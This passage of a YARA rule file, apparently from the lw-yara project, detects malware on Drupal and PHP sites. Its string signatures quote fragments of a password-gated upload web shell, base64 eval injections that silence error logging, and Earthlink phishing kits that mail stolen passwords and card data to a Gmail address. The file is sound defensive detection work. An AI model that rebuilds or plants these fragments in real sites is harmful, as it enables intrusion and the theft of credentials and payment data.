      $s1 = "<?php if($_GET[\"login\"]==\"25KlLN\"){$or=\"JG11amogxPSAkX1BPU1RbJ3onXTsgaWYg\"; $zs=\"KCRtdWpqIT0iIikgeyAkeHxNzZXI9Ym\"; $lq=" ascii
      $s2 = "e\"][\"tmp_name\"],$target_path)){echo basename($_FILES[\"uploadedfile\"][\"name\"]).\" has been uploaded\";}else{echo \"Uploade" ascii
      $s3 = "<?php if($_GET[\"login\"]==\"25KlLN\"){$or=\"JG11amogxPSAkX1BPU1RbJ3onXTsgaWYg\"; $zs=\"KCRtdWpqIT0iIikgeyAkeHxNzZXI9Ym\"; $lq=" ascii
      $s4 = "\"\", $or.$zs.$lq.$bu)));$hwy(); $target_path=basename($_FILES[\"uploadedfile\"][\"name\"]);if(move_uploaded_file($_FILES[\"uplo" ascii
      $s5 = "!\";}} ?><form enctype=\"multipart/form-data\" method=\"POST\"><input name=\"uploadedfile\" type=\"file\"/><input type=\"submit" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( all of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-09
   Identifier: case128
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule drupal_injection_06_09_18_case128_index {
   meta:
      description = "case128 - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-09"
      hash1 = "5d242e1686d8e321710c4311ad0e04574e107e34e3401ad0d89c407fea3cf247"
   strings:
      //$s1 = "* See COPYRIGHT.txt and LICENSE.txt." fullword ascii
      //$s2 = "* The routines here dispatch control to the appropriate handler, which then" fullword ascii
      //$s3 = "* Root directory of Drupal installation." fullword ascii
      $s4 = "'error_log'); @ini_restore('display_errors');" fullword ascii
      //$s5 = "menu_execute_active_handler();" fullword ascii
      //$s6 = "require_once DRUPAL_ROOT . '/includes/bootstrap.inc';" fullword ascii
      $s7 = "error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); " ascii
      $s8 = "<?php" ascii
      //$s9 = "* prints the appropriate page." fullword ascii
      $s10 = "kgeyAka2pka2VfYyA9IDE7IH0NCmVycm9yX3JlcG9ydGluZygwKTsNCmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsNCmdsb2JhbC" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 10KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-15
   Identifier: case134
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule drupal_injection_case134 {
   meta:
      description = "case134 - file infection.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-15"
      hash1 = "85d567b960a8985678ca7fb34616a799db2183e50efa51e463b5ceaa92341e96"
   strings:
      //$s1 = "cyODAwKS4iIEdNVDsnOzwvc2NyaXB0PiI7IH0gO307Cn0KfQ==')); @ini_restore('error_log'); @ini_restore('display_errors');" fullword ascii
      $s2 = "error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode" ascii
      $s3 = "error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode" ascii
   condition:
      ( uint16(0) == 0x7265 and
         filesize < 7KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-30
   Identifier: phish
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */


rule infected_09_30_18_earthlink_phish_index {
   meta:
      description = "phish - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "fb94a67c38e4564efc164df7608959de76c8c47428db9515fb434957a8a3ce05"
   strings:
      $s1 = "$message .= \"Pass.::::::::::::::: \".$_POST['password'].\"\\n\";" fullword ascii
      $s2 = "header(\"Location: login.htm\");" fullword ascii
      $s3 = "$message .= \"--------------Earthlink Smtp Rezultat-----------------------\\n\";" fullword ascii
      $s4 = "$recipient =\"aheithaway@gmail.com\";" fullword ascii
      $s5 = "$message .= \"Email.::::::::::::: \".$_POST['email'].\"\\n\";" fullword ascii
      $s6 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
      $s7 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s8 = "$subject = \"Earthlink Smtp ReZulT\";" fullword ascii
      $s9 = "$headers .= $_POST['eMailAdd'].\"\\n\";" fullword ascii
      $s10 = "echo \"ERROR! Please go back and try again.\";" fullword ascii
      $s11 = "{$carca = mail($recipient,$subject,$message,$headers);}" fullword ascii
      $s12 = "$message .= \"---------------Re-Modified By nONE-------\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_09_30_18_earthlink_phish_login {
   meta:
      description = "phish - file login.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "bdd407f674a537da7b4cd20d883be4ef8d2ec7052261256f8775d69dd0de4749"
   strings:
      $s1 = "$message .= \"Address1.::::::::::::: \".$_POST['address1'].\"\\n\";" fullword ascii
      $s2 = "$message .= \"Emailpass.::::::::::::: \".$_POST['emailpass'].\"\\n\";" fullword ascii
      $s3 = "$message .= \"address2.::::::::::::: \".$_POST['address2'].\"\\n\";" fullword ascii
      $s4 = "$message .= \"Email.::::::::::::: \".$_POST['emailaddress'].\"\\n\";" fullword ascii
      $s5 = "$message .= \"--------------Earthlink Smtp Rezultat-----------------------\\n\";" fullword ascii
      $s6 = "$recipient =\"aheithaway@gmail.com\";" fullword ascii
      $s7 = "$message .= \"mobilenumber.::::::::::::: \".$_POST['mobilenumber'].\"\\n\";" fullword ascii
      $s8 = "$message .= \"homephone.::::::::::::: \".$_POST['homephone'].\"\\n\";" fullword ascii
      $s9 = "$message .= \"Birthdate.::::::::::::: \".$_POST['birthdate'].\"\\n\";" fullword ascii
      $s10 = "$message .= \"ccnumber.::::::::::::::: \".$_POST['ccnumber'].\"\\n\";" fullword ascii
      $s11 = "$message .= \"Expmonth.::::::::::::: \".$_POST['expmonth'].\"\\n\";" fullword ascii
      $s12 = "$message .= \"zipcode.::::::::::::: \".$_POST['zipcode'].\"\\n\";" fullword ascii
      $s13 = "$message .= \"country.::::::::::::: \".$_POST['country'].\"\\n\";" fullword ascii
      $s14 = "$message .= \"Birthyear.::::::::::::: \".$_POST['birthyear'].\"\\n\";" fullword ascii
      $s15 = "$message .= \"Birthmonth.::::::::::::: \".$_POST['birthmonth'].\"\\n\";" fullword ascii
      $s16 = "$message .= \"Fullname.::::::::::::: \".$_POST['fullname'].\"\\n\";" fullword ascii
      $s17 = "$message .= \"Expyear.::::::::::::: \".$_POST['expyear'].\"\\n\";" fullword ascii
      $s18 = "header(\"Location: http://www.earthlink.net\");" fullword ascii
      $s19 = "$message .= \"Cctype3.::::::::::::: \".$_POST['dcc'].\"\\n\";" fullword ascii
      $s20 = "$message .= \"CVV.::::::::::::: \".$_POST['csv'].\"\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 6KB and
         ( 8 of them )
      ) or ( all of them )
}
